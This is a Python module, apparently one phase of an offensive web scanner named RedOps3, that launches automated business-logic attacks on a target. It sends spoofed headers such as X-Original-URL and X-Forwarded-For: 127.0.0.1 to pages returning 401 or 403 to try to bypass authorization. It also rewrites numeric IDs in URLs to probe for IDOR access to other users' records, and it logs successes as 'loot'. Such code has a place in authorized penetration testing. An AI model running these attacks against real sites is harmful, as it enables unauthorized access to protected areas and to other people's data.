import requests
import concurrent.futures
import re
from urllib.parse import urlparse, urljoin
from core.results_store import load_results

class LogicAssaultScanner:
    """
    Phase 8: Business Logic & API Assault.
    Ports advanced RedOps2 capabilities:
    1. Auth Bypass (401/403 headers)
    2. IDOR (Numeric ID fuzzing)
    """

    AUTH_BYPASS_HEADERS = {
        "X-Original-URL": ["/admin", "/console"],
        "X-Rewrite-URL": ["/admin", "/console"],
        "X-Forwarded-For": ["127.0.0.1", "localhost"],
        "X-Custom-IP-Authorization": ["127.0.0.1"],
        "X-Originating-IP": ["127.0.0.1"],
        "X-Remote-IP": ["127.0.0.1"],
        "Client-IP": ["127.0.0.1"]
    }

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "RedOps3-LogicAssault/1.0"})

    def scan(self, target, scan_id, logger=None):
        if logger: logger(f"Logic Assault: Initiating Business Logic Attacks on {target}", "INFO")
        
        findings = []
        
        # Load all discovered URLs
        urls = self._get_scan_urls(scan_id)
        if not urls:
            if logger: logger("Logic Assault: No URLs found to test.", "WARN")
            return []

        if logger: logger(f"Logic Assault: Scope -> {len(urls)} URLs loaded.", "INFO")

        # 1. Auth Bypass (Targeting 403/401 endpoints)
        # We need to identify which URLs are protected first.
        # Ideally, we used the status codes from previous phases, but we can re-check or filter.
        protected_urls = [u for u in urls if any(x in u for x in ['admin', 'dashboard', 'private', 'api'])] 
        # A simple keyword filter for high-value targets to avoid spamming every asset
        
        if protected_urls:
            findings.extend(self.scan_auth_bypass(protected_urls, logger))

        # 2. IDOR (Targeting numeric IDs)
        idor_findings = self.scan_idor(urls, logger)
        findings.extend(idor_findings)

        return findings

    def _get_scan_urls(self, scan_id):
        try:
            results = load_results(scan_id)
            if not results: return []
            
            urls = set()
            # Extract from Katana
            if "enum" in results.get("phases", {}) and "katana" in results["phases"]["enum"]:
                 # Assuming list of strings for simplicity or extracting from dict
                 k_data = results["phases"]["enum"]["katana"]
                 if isinstance(k_data, list):
                     for k in k_data:
                         if isinstance(k, str): urls.add(k)
                         elif isinstance(k, dict) and "url" in k: urls.add(k["url"])
            
            # Extract from FFUF
            if "dirbusting" in results.get("phases", {}) and "ffuf" in results["phases"]["dirbusting"]:
                 f_data = results["phases"]["dirbusting"]["ffuf"]
                 if isinstance(f_data, dict) and "endpoints" in f_data:
                     for ep in f_data["endpoints"]:
                         urls.add(ep.get("url"))
            
            return list(urls)
        except Exception:
            return []

    def scan_auth_bypass(self, urls, logger):
        findings = []
        if logger: logger(f"Logic Assault: Testing Auth Bypass on {len(urls)} potential high-value targets...", "INFO")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {executor.submit(self._test_bypass_headers, url): url for url in urls}
            for future in concurrent.futures.as_completed(future_to_url):
                res = future.result()
                if res:
                    findings.append(res)
                    if logger: logger(f"Auth Bypass SUCCEEDED: {res['title']}", "SUCCESS")
        return findings

    def _test_bypass_headers(self, url):
        # First check baseline
        try:
            base = self.session.get(url, timeout=5, verify=True)
            if base.status_code not in [401, 403]:
                return None # Not protected, skip bypass attempt
        except Exception:
            return None

        # Try bypass headers
        for header, values in self.AUTH_BYPASS_HEADERS.items():
            for val in values:
                try:
                    headers = {header: val}
                    resp = self.session.get(url, headers=headers, timeout=5, verify=True)
                    
                    # If status code changes to 200/202/302 from 403/401
                    if resp.status_code in [200, 202] and len(resp.content) > 0:
                         return {
                             "title": f"Auth Bypass ({header})",
                             "description": f"Bypassed {base.status_code} on {url}\nHeader: {header}: {val}\nResponse: {resp.status_code}",
                             "severity": "critical",
                             "tool_source": "LogicAssault",
                             "url": url,
                             "raw_loot": f"Bypass with {header}: {val}"
                         }
                except Exception:
                    pass
        return None

    def scan_idor(self, urls, logger):
        findings = []
        # Find URLs with numeric IDs like /users/123 or ?id=123
        # Regex for ID in path: /<digits>/ or /<digits>$
        # Regex for ID in query: id=<digits> or user_id=<digits>
        
        idor_candidates = []
        for url in urls:
            if re.search(r'/\d+($|/|\?)', url) or re.search(r'[?&](id|user|account|order|uid|uuid|profile|invoice|doc|file|msg|message)=\d+', url):
                idor_candidates.append(url)
        
        # Dedup
        idor_candidates = list(set(idor_candidates))
        
        if not idor_candidates:
            return []

        if logger: logger(f"Logic Assault: Testing IDOR on {len(idor_candidates)} candidates...", "INFO")

        # Test logic: Replace ID with '1', '0', or decrement/increment
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
             future_to_url = {executor.submit(self._test_idor, url): url for url in idor_candidates}
             for future in concurrent.futures.as_completed(future_to_url):
                 res = future.result()
                 if res:
                     findings.extend(res)
        return findings
    
    def _test_idor(self, url):
        found = []
        # Extract ID
        # Simple strategy: replace all numeric sequences with '1' and check (naive but effective for basic IDOR)
        
        # 1. Path IDOR
        if re.search(r'/\d+', url):
             # Try replacing with 1
             modified = re.sub(r'/(\d+)', '/1', url)
             if modified != url:
                 if self._check_access(modified):
                     found.append(self._make_idor_finding(url, modified, "Path IDOR"))

             # Try replacing with 0
             modified_0 = re.sub(r'/(\d+)', '/0', url)
             if modified_0 != url:
                 if self._check_access(modified_0):
                     found.append(self._make_idor_finding(url, modified_0, "Path IDOR (ID=0)"))

        # 2. Query IDOR
        if re.search(r'=\d+', url):
            modified = re.sub(r'=(\d+)', '=1', url)
            if modified != url:
                if self._check_access(modified):
                    found.append(self._make_idor_finding(url, modified, "Query IDOR"))

        return found

    def _check_access(self, url):
        # We assume if we get a 200 OK and significant content, it's a hit.
        # Real IDOR checking is hard without comparing to authorized baseline.
        # But for an unauthorized scanner, 200 OK on /users/1 is interesting if /users/me is the norm.
        try:
            resp = self.session.get(url, timeout=5, verify=True)
            if resp.status_code == 200 and "login" not in resp.url and len(resp.text) > 500:
                # Basic heuristic
                if "error" not in resp.text.lower() and "unauthorized" not in resp.text.lower():
                    return True
        except Exception:
            pass
        return False

    def _make_idor_finding(self, original, modified, type_str):
        return {
             "title": f"Potential {type_str}",
             "description": f"Accessible data at {modified}\nOriginal: {original}\nPossible Broken Object Level Authorization.",
             "severity": "high",
             "tool_source": "LogicAssault",
             "url": modified
        }
